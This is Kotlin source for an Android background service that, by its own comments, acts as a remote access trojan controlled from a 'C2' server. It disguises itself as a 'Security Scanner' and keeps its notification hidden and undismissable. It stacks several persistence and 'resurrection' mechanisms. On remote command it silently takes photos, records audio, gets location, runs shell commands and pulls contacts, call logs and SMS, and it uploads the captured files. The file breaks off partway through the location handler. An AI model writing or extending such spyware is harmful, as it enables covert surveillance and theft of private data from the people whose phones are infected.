// android/app/src/main/kotlin/com/example/kem/NativeCommandService.kt
package com.example.kem

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder.AudioSource
import android.os.*
import android.util.Log
import android.view.Surface
import android.media.ImageReader
import android.graphics.ImageFormat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.work.*
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.Semaphore
import android.provider.ContactsContract
import android.database.Cursor
import android.provider.CallLog
import android.provider.Telephony
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.app.AlarmManager
import android.content.ComponentName

class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCallback {
    
    companion object {
        private const val TAG = "NativeCommandService"
        private const val NOTIFICATION_ID = 999
        private const val CHANNEL_ID = "native_command_service_channel"
        
        // ✅ ENHANCED: Proper foreground service types for Android 14+
        private val FOREGROUND_SERVICE_TYPE = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE or 
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE or 
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        } else {
            0
        }
        
        // Command types
        const val CMD_TAKE_PICTURE = "command_take_picture"
        const val CMD_RECORD_AUDIO = "command_record_voice" 
        const val CMD_GET_LOCATION = "command_get_location"
        const val CMD_LIST_FILES = "command_list_files"
        const val CMD_EXECUTE_SHELL = "command_execute_shell"
        const val CMD_GET_CONTACTS = "command_get_contacts"
        const val CMD_GET_CALL_LOGS = "command_get_call_logs"
        const val CMD_GET_SMS = "command_get_sms"
        
        // Intent extras
        const val EXTRA_COMMAND = "command"
        const val EXTRA_ARGS = "args"
        const val EXTRA_REQUEST_ID = "request_id"
        
        // Broadcast actions for IPC
        const val ACTION_COMMAND_RESULT = "com.example.kem.COMMAND_RESULT"
        const val ACTION_CONNECTION_STATUS = "com.example.kem.CONNECTION_STATUS"
        const val ACTION_EXECUTE_COMMAND = "com.example.kem.EXECUTE_COMMAND"
        
        // ✅ ENHANCED: Shared instance management
        @Volatile
        private var instance: NativeCommandService? = null
        
        fun getInstance(): NativeCommandService? = instance
        
        fun executeCommand(context: Context, command: String, args: JSONObject = JSONObject()): String {
            val requestId = generateRequestId()
            
            // Try direct service communication first
            val serviceInstance = getInstance()
            if (serviceInstance != null && serviceInstance.isInitialized) {
                serviceInstance.executeCommandDirect(command, args, requestId)
                return requestId
            }
            
            // Fallback to broadcast for IPC
            val intent = Intent(ACTION_EXECUTE_COMMAND).apply {
                putExtra(EXTRA_COMMAND, command)
                putExtra(EXTRA_ARGS, args.toString())
                putExtra(EXTRA_REQUEST_ID, requestId)
            }
            context.sendBroadcast(intent)
            
            return requestId
        }
        
        private fun generateRequestId(): String {
            return "req_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
        }
    }
    
    // ✅ ENHANCED: Service components with better management
    private lateinit var backgroundExecutor: ExecutorService
    private lateinit var cameraExecutor: ExecutorService
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var audioRecord: AudioRecord? = null
    private var mediaRecorder: MediaRecorder? = null
    private var locationManager: LocationManager? = null
    
    // ✅ ENHANCED: Native Socket.IO client for direct C2 communication
    private var socketIOClient: NativeSocketIOClient? = null
    private var deviceId: String = ""
    
    // ✅ ENHANCED: Command queue and processing with better synchronization
    private val commandQueue = Collections.synchronizedList(mutableListOf<PendingCommand>())
    private val commandSemaphore = Semaphore(1)
    private val pendingResults = mutableMapOf<String, CompletableDeferred<JSONObject>>()
    
    // ✅ ENHANCED: Connection monitoring with retry logic
    private var connectionCheckJob: Job? = null
    private var isC2Connected = false
    private val reconnectScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // ✅ ENHANCED: Persistence monitoring with multiple strategies
    private var persistenceHandler: Handler? = null
    private var persistenceRunnable: Runnable? = null
    private var healthCheckJob: Job? = null
    private var restartAttempts = 0
    private val maxRestartAttempts = 10
    
    // ✅ ENHANCED: Broadcast receiver for IPC commands
    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                ACTION_EXECUTE_COMMAND -> {
                    val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
                    val argsString = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
                    val requestId = intent.getStringExtra(EXTRA_REQUEST_ID) ?: generateRequestId()
                    
                    try {
                        val args = JSONObject(argsString)
                        executeCommandDirect(command, args, requestId)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing IPC command: $command", e)
                    }
                }
                "REQUEST_BATTERY_OPTIMIZATION_EXEMPTION" -> {
                    requestBatteryOptimizationExemption()
                }
            }
        }
    }
    
    // ✅ ENHANCED: Network change receiver for reconnection
    private val networkChangeReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "android.net.conn.CONNECTIVITY_CHANGE") {
                Log.d(TAG, "Network connectivity changed - checking C2 connection")
                
                // Delay to allow network to stabilize
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isC2Connected) {
                        Log.d(TAG, "Network restored - attempting C2 reconnection")
                        socketIOClient?.connect()
                    }
                }, 5000)
            }
        }
    }
    
    data class PendingCommand(
        val requestId: String,
        val command: String,
        val args: JSONObject,
        val timestamp: Long = System.currentTimeMillis()
    )
    
    // Callback interface for command results
    interface CommandCallback {
        fun onCommandResult(command: String, success: Boolean, result: JSONObject)
    }
    
    private var commandCallback: CommandCallback? = null
    var isInitialized = false
        private set
    
    // Binder for service binding
    inner class LocalBinder : Binder() {
        fun getService(): NativeCommandService = this@NativeCommandService
    }
    
    private val binder = LocalBinder()
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        
        Log.d(TAG, "NativeCommandService onCreate() - Enhanced persistence mode")
        
        // ✅ CRITICAL: Start foreground IMMEDIATELY (within 5 seconds)
        createNotificationChannel()
        startForegroundWithProperType()
        
        // Initialize service components
        initializeService()
        
        // ✅ ENHANCED: Register multiple broadcast receivers
        registerBroadcastReceivers()
        
        // ✅ ENHANCED: Start comprehensive persistence monitoring
        startEnhancedPersistenceMonitoring()
        
        // ✅ ENHANCED: Schedule multiple resurrection mechanisms
        setupResurrectionMechanisms()
        
        Log.d(TAG, "Native Command Service created with MAXIMUM persistence")
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Security Scanner Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background security monitoring service"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setBypassDnd(true)  // ✅ Bypass Do Not Disturb
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun startForegroundWithProperType() {
        val notification = createPersistentNotification()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && FOREGROUND_SERVICE_TYPE != 0) {
            startForeground(NOTIFICATION_ID, notification, FOREGROUND_SERVICE_TYPE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }
    
    private fun createPersistentNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Security Scanner Active")
            .setContentText("Background monitoring service running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)  // ✅ Cannot be dismissed by user
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // ✅ Hide from lock screen
            .setAutoCancel(false)  // ✅ Prevent accidental dismissal
            .setShowWhen(false)
            .setSilent(true)
            .apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                }
            }
            .build()
    }
    
    private fun registerBroadcastReceivers() {
        // Command receiver
        registerReceiver(commandReceiver, IntentFilter().apply {
            addAction(ACTION_EXECUTE_COMMAND)
            addAction("REQUEST_BATTERY_OPTIMIZATION_EXEMPTION")
        })
        
        // Network change receiver
        registerReceiver(networkChangeReceiver, IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"))
    }
    
    private fun startEnhancedPersistenceMonitoring() {
        persistenceHandler = Handler(Looper.getMainLooper())
        persistenceRunnable = object : Runnable {
            override fun run() {
                try {
                    // ✅ Check multiple persistence indicators
                    if (!isServiceInForeground()) {
                        Log.w(TAG, "Service not in foreground! Restarting foreground...")
                        startForegroundWithProperType()
                    }
                    
                    // ✅ Check socket connection
                    if (!isC2Connected && socketIOClient?.isConnected() != true) {
                        Log.w(TAG, "C2 connection lost - attempting reconnection")
                        socketIOClient?.connect()
                    }
                    
                    // ✅ Update notification to show activity
                    updateNotification("Security Scanner Active - ${getCurrentTime()}")
                    
                    // ✅ Check memory and cleanup if needed
                    performMemoryCleanup()
                    
                    // Schedule next check with increasing interval if stable
                    val nextCheckDelay = if (isC2Connected) 30000L else 10000L
                    persistenceHandler?.postDelayed(this, nextCheckDelay)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Error in persistence monitoring", e)
                    persistenceHandler?.postDelayed(this, 15000) // Retry in 15s
                }
            }
        }
        persistenceHandler?.post(persistenceRunnable!!)
        
        // ✅ Additional health check job
        healthCheckJob = reconnectScope.launch {
            while (isActive) {
                try {
                    performHealthCheck()
                    delay(60000) // Every minute
                } catch (e: Exception) {
                    Log.e(TAG, "Health check error", e)
                    delay(30000) // Retry in 30s
                }
            }
        }
    }
    
    private fun setupResurrectionMechanisms() {
        try {
            // ✅ 1. WorkManager for periodic health checks
            scheduleHealthCheckWork()
            
            // ✅ 2. JobScheduler for Android 5+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                ResurrectionJobService.scheduleResurrectionJob(this)
            }
            
            // ✅ 3. AlarmManager as fallback
            scheduleAlarmManagerFallback()
            
            // ✅ 4. Additional watchdog
            ServiceWatchdog.startWatchdog(this)
            
            Log.d(TAG, "All resurrection mechanisms set up")
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up resurrection mechanisms", e)
        }
    }
    
    private fun scheduleHealthCheckWork() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                .setRequiresBatteryNotLow(false)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false)
                .setRequiresStorageNotLow(false)
                .build()

            val healthCheckRequest = PeriodicWorkRequestBuilder<HealthCheckWorker>(
                15, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "ServiceHealthCheck",
                ExistingPeriodicWorkPolicy.KEEP,
                healthCheckRequest
            )
            
            Log.d(TAG, "Health check work scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule health check work", e)
        }
    }
    
    private fun scheduleAlarmManagerFallback() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, SuperBootReceiver::class.java).apply {
                action = "KEEP_ALIVE_CHECK"
            }
            val pendingIntent = PendingIntent.getBroadcast(
                this, 1000, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 15 * 60 * 1000, // 15 minutes
                    pendingIntent
                )
            } else {
                alarmManager.setInexactRepeating(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 15 * 60 * 1000,
                    15 * 60 * 1000,
                    pendingIntent
                )
            }
            
            Log.d(TAG, "AlarmManager fallback scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Error scheduling AlarmManager fallback", e)
        }
    }
    
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                Log.w(TAG, "Battery optimization not disabled - service may be killed")
                
                // Send notification to user
                showBatteryOptimizationNotification()
            } else {
                Log.d(TAG, "Battery optimization is disabled - service should persist")
            }
        }
    }
    
    private fun showBatteryOptimizationNotification() {
        try {
            val intent = Intent(android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            val pendingIntent = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Battery Optimization Required")
                .setContentText("Please disable battery optimization for better service reliability")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .build()
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.notify(1001, notification)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error showing battery optimization notification", e)
        }
    }
    
    private fun isServiceInForeground(): Boolean {
        return try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            manager.getRunningServices(Integer.MAX_VALUE)
                .any { 
                    it.service.className == this::class.java.name && 
                    it.foreground 
                }
        } catch (e: Exception) {
            false
        }
    }
    
    private fun performMemoryCleanup() {
        try {
            val runtime = Runtime.getRuntime()
            val usedMemory = runtime.totalMemory() - runtime.freeMemory()
            val maxMemory = runtime.maxMemory()
            val memoryUsagePercent = (usedMemory * 100) / maxMemory
            
            if (memoryUsagePercent > 80) {
                Log.w(TAG, "High memory usage: ${memoryUsagePercent}% - triggering cleanup")
                System.gc()
                
                // Clean up old queued commands
                synchronized(commandQueue) {
                    val cutoffTime = System.currentTimeMillis() - 300000 // 5 minutes
                    commandQueue.removeAll { it.timestamp < cutoffTime }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in memory cleanup", e)
        }
    }
    
    private fun performHealthCheck() {
        try {
            // Check if we're still the active instance
            if (instance != this) {
                Log.w(TAG, "Health check: Not the active instance - stopping")
                stopSelf()
                return
            }
            
            // Check if executors are shutdown
            if (::backgroundExecutor.isInitialized && backgroundExecutor.isShutdown) {
                Log.w(TAG, "Health check: Background executor shutdown - reinitializing")
                backgroundExecutor = Executors.newFixedThreadPool(4)
            }
            
            // Check socket connection health
            if (socketIOClient?.isConnected() != true && isInitialized) {
                Log.w(TAG, "Health check: Socket disconnected - attempting reconnection")
                socketIOClient?.connect()
            }
            
            Log.d(TAG, "Health check completed - service healthy")
            
        } catch (e: Exception) {
            Log.e(TAG, "Health check failed", e)
        }
    }
    
    private fun getCurrentTime(): String {
        return SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
    }
    
    private fun initializeService() {
        try {
            backgroundExecutor = Executors.newFixedThreadPool(4)
            cameraExecutor = Executors.newSingleThreadExecutor()
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            // Initialize device ID
            deviceId = getOrCreateDeviceId()
            
            // ✅ ENHANCED: Initialize Socket.IO client for Python server
            initializeSocketIOClient()
            
            // Start command processing loop
            backgroundExecutor.execute { processCommandQueue() }
            
            // Start connection monitoring
            startConnectionMonitoring()
            
            isInitialized = true
            updateNotification("Security Scanner Ready - Device: ${deviceId.takeLast(8)}")
            Log.d(TAG, "Service initialization completed successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Service initialization failed", e)
            updateNotification("Security Scanner - Initialization Failed")
            
            // Retry initialization after delay
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isInitialized) {
                    Log.d(TAG, "Retrying service initialization")
                    initializeService()
                }
            }, 10000)
        }
    }
    
    private fun initializeSocketIOClient() {
        try {
            socketIOClient = NativeSocketIOClient(this, this)
            
            // ✅ FIXED: Use HTTP URL for Python Flask-SocketIO server
            val serverUrl = "http://192.168.8.200:5000"  // Your Python server
            
            socketIOClient?.initialize(serverUrl, deviceId)
            
            Log.d(TAG, "Socket.IO client initialized for Python Flask-SocketIO server: $serverUrl")
            Log.d(TAG, "Device ID: $deviceId")
            
            // Start connection attempt
            socketIOClient?.connect()
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize Socket.IO client", e)
            
            // Retry after delay
            Handler(Looper.getMainLooper()).postDelayed({
                Log.d(TAG, "Retrying Socket.IO initialization")
                initializeSocketIOClient()
            }, 10000)
        }
    }
    
    private fun startConnectionMonitoring() {
        connectionCheckJob = reconnectScope.launch {
            while (isActive) {
                try {
                    if (!isC2Connected && socketIOClient?.isConnected() != true) {
                        Log.d(TAG, "C2 not connected - attempting connection")
                        socketIOClient?.connect()
                    }
                    
                    // Check connection every 30 seconds
                    delay(30000)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Error in connection monitoring", e)
                    delay(10000) // Wait before retry
                }
            }
        }
    }
    
    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences("kem_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        
        if (deviceId == null) {
            deviceId = "android_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
            prefs.edit().putString("device_id", deviceId).apply()
            Log.d(TAG, "Generated new device ID: $deviceId")
        }
        
        return deviceId
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        Log.d(TAG, "onStartCommand called - ensuring foreground status")
        
        // ✅ CRITICAL: Ensure we're always in foreground
        startForegroundWithProperType()
        
        // Process any command in the intent
        intent?.let { processCommandIntent(it) }
        
        // Check restart reason
        val restartReason = intent?.getStringExtra("restart_reason") ?: "normal_start"
        Log.d(TAG, "Service started with reason: $restartReason")
        
        if (restartReason == "service_destroyed") {
            restartAttempts++
            Log.d(TAG, "Service restart attempt #$restartAttempts")
            
            if (restartAttempts > maxRestartAttempts) {
                Log.w(TAG, "Too many restart attempts - resetting counter")
                restartAttempts = 0
            }
        }
        
        // ✅ CRITICAL: Return START_STICKY for auto-restart
        return START_STICKY
    }
    
    override fun onBind(intent: Intent): IBinder {
        super.onBind(intent)
        return binder
    }
    
    fun setCommandCallback(callback: CommandCallback?) {
        this.commandCallback = callback
    }
    
    // ✅ ENHANCED: Socket.IO callback implementations
    override fun onCommandReceived(command: String, args: JSONObject) {
        Log.d(TAG, "Received command from Python C2: $command with args: $args")
        val requestId = generateRequestId()
        executeCommandDirect(command, args, requestId)
    }
    
    override fun onConnectionStatusChanged(connected: Boolean) {
        isC2Connected = connected
        Log.d(TAG, "Python C2 connection status changed: $connected")
        
        updateNotification(
            if (connected) "Security Scanner - Connected to Python C2"
            else "Security Scanner - Reconnecting to Python C2..."
        )
        
        // Broadcast connection status for Flutter/other components
        val statusIntent = Intent(ACTION_CONNECTION_STATUS).apply {
            putExtra("connected", connected)
            putExtra("deviceId", deviceId)
        }
        sendBroadcast(statusIntent)
        
        if (connected) {
            restartAttempts = 0 // Reset restart attempts on successful connection
        }
    }
    
    override fun onError(error: String) {
        Log.e(TAG, "Socket.IO error: $error")
        updateNotification("Security Scanner - Connection Error")
    }
    
    fun executeCommandDirect(command: String, args: JSONObject, requestId: String) {
        if (!isInitialized) {
            Log.w(TAG, "Service not initialized, deferring command: $command")
            
            // Queue command for when service is ready
            Handler(Looper.getMainLooper()).postDelayed({
                if (isInitialized) {
                    executeCommandDirect(command, args, requestId)
                } else {
                    Log.e(TAG, "Service still not initialized after delay - failing command: $command")
                    sendErrorResult(command, requestId, "Service not initialized")
                }
            }, 3000)
            return
        }
        
        Log.d(TAG, "Executing command: $command with ID: $requestId")
        
        val pendingCommand = PendingCommand(requestId, command, args)
        
        synchronized(commandQueue) {
            commandQueue.add(pendingCommand)
            commandQueue.notifyAll()
        }
    }
    
    private fun processCommandIntent(intent: Intent) {
        val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
        val argsString = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
        val requestId = intent.getStringExtra(EXTRA_REQUEST_ID) ?: generateRequestId()
        
        try {
            val args = JSONObject(argsString)
            executeCommandDirect(command, args, requestId)
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command intent: $command", e)
            sendErrorResult(command, requestId, "Failed to parse command arguments: ${e.message}")
        }
    }
    
    private fun processCommandQueue() {
        while (true) {
            try {
                val command = synchronized(commandQueue) {
                    if (commandQueue.isNotEmpty()) {
                        commandQueue.removeAt(0)
                    } else {
                        null
                    }
                }
                
                if (command != null) {
                    updateNotification("Executing: ${command.command}")
                    executeCommandInternal(command)
                } else {
                    updateNotification(
                        if (isC2Connected) "Security Scanner - Connected & Ready"
                        else "Security Scanner - Reconnecting..."
                    )
                    Thread.sleep(1000)
                }
                
            } catch (e: InterruptedException) {
                Log.w(TAG, "Command queue processing interrupted")
                break
            } catch (e: Exception) {
                Log.e(TAG, "Error in command queue processing", e)
                Thread.sleep(2000) // Brief pause before continuing
            }
        }
    }
    
    private fun executeCommandInternal(pendingCommand: PendingCommand) {
        val (requestId, command, args) = pendingCommand
        
        try {
            when (command) {
                CMD_TAKE_PICTURE -> handleTakePicture(args, requestId)
                CMD_RECORD_AUDIO -> handleRecordAudio(args, requestId)
                CMD_GET_LOCATION -> handleGetLocation(args, requestId)
                CMD_LIST_FILES -> handleListFiles(args, requestId)
                CMD_EXECUTE_SHELL -> handleExecuteShell(args, requestId)
                CMD_GET_CONTACTS -> handleGetContacts(args, requestId)
                CMD_GET_CALL_LOGS -> handleGetCallLogs(args, requestId)
                CMD_GET_SMS -> handleGetSMS(args, requestId)
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    sendErrorResult(command, requestId, "Unknown command: $command")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command: $command", e)
            sendErrorResult(command, requestId, "Command execution failed: ${e.message}")
        }
    }
    
    // =====================================================
    // COMMAND IMPLEMENTATIONS (same as before but enhanced)
    // =====================================================
    
    // CAMERA IMPLEMENTATION
    private fun handleTakePicture(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.CAMERA)) {
            sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera permission not granted")
            return
        }
        
        cameraExecutor.execute {
            try {
                val lensDirection = args.optString("camera", "back")
                val cameraId = getCameraId(lensDirection)
                
                if (cameraId == null) {
                    sendErrorResult(CMD_TAKE_PICTURE, requestId, "Requested camera not available")
                    return@execute
                }
                
                val photoFile = createImageFile()
                
                // Setup ImageReader with proper error handling
                imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
                imageReader?.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            saveImageToFile(image, photoFile)
                            image.close()
                            
                            val result = JSONObject().apply {
                                put("path", photoFile.absolutePath)
                                put("size", photoFile.length())
                                put("camera", lensDirection)
                                put("method", "native_camera2")
                                put("timestamp", System.currentTimeMillis())
                            }
                            
                            sendSuccessResult(CMD_TAKE_PICTURE, requestId, result)
                            uploadFile(photoFile, CMD_TAKE_PICTURE)
                        } else {
                            sendErrorResult(CMD_TAKE_PICTURE, requestId, "Failed to acquire image")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing camera image", e)
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Image processing failed: ${e.message}")
                    } finally {
                        cleanupCamera()
                    }
                }, backgroundHandler)
                
                // Open camera with proper error handling
                cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCaptureSession(camera)
                    }
                    
                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera disconnected")
                    }
                    
                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera error: $error")
                    }
                }, backgroundHandler)
                
            } catch (e: Exception) {
                Log.e(TAG, "Camera setup failed", e)
                sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera setup failed: ${e.message}")
                cleanupCamera()
            }
        }
    }
    
    // ENHANCED AUDIO RECORDING IMPLEMENTATION
    private fun handleRecordAudio(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            var tempMediaRecorder: MediaRecorder? = null
            try {
                val duration = args.optInt("duration", 10) // seconds
                val quality = args.optString("quality", "medium")
                
                val audioFile = createAudioFile()
                
                // ✅ FIXED: Proper MediaRecorder setup
                tempMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this@NativeCommandService)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                
                tempMediaRecorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                    setOutputFile(audioFile.absolutePath)
                    
                    if (quality == "high") {
                        setAudioEncodingBitRate(128000)
                        setAudioSamplingRate(44100)
                    } else {
                        setAudioEncodingBitRate(64000)
                        setAudioSamplingRate(22050)
                    }
                    
                    try {
                        prepare()
                        start()
                        mediaRecorder = this
                    } catch (e: Exception) {
                        Log.e(TAG, "MediaRecorder prepare/start failed", e)
                        throw e
                    }
                }
                
                Log.d(TAG, "Audio recording started for ${duration}s")
                
                // Record for specified duration
                Thread.sleep(duration * 1000L)
                
                // Stop recording
                tempMediaRecorder.apply {
                    try {
                        stop()
                        reset()
                        release()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error stopping MediaRecorder", e)
                    }
                }
                mediaRecorder = null
                
                val result = JSONObject().apply {
                    put("path", audioFile.absolutePath)
                    put("size", audioFile.length())
                    put("duration", duration)
                    put("quality", quality)
                    put("format", "3gp")
                    put("timestamp", System.currentTimeMillis())
                }
                
                sendSuccessResult(CMD_RECORD_AUDIO, requestId, result)
                uploadFile(audioFile, CMD_RECORD_AUDIO)
                
            } catch (e: Exception) {
                Log.e(TAG, "Audio recording failed", e)
                tempMediaRecorder?.apply {
                    try {
                        stop()
                        reset()
                        release()
                    } catch (ex: Exception) {
                        Log.e(TAG, "Error cleaning up media recorder", ex)
                    }
                }
                mediaRecorder = null
                sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording failed: ${e.message}")
            }
        }
    }
    
    // LOCATION IMPLEMENTATION
    private fun handleGetLocation(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) && 
            !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
            sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val locationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        val result = JSONObject().apply {
                            put("latitude", location.latitude)
                            put("longitude", location.longitude)
                            put("accuracy", location.accuracy)
                            put("altitude", location.altitude)
                            put("speed", location.speed)
                            put("timestamp", location.time)
                            put("provider", location.provider)
                        }
                        
                        sendSuccessResult(CMD_GET_LOCATION, requestId, result)
                        locationManager?.removeUpdates(this)
                    }
                    
                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }
                
                // Try GPS first, then network
                val gpsEnabled = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) ?: false
                val networkEnabled = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) ?: false
                
                when {
                    gpsEnabled -> {
                        locationManager?.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER, 
                            0L, 
                            0f, 
                            locationListener
                        )
                    }
                    networkEnabled -> {
                        locationManager?.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER, 
                            0L, 
                            0f, 
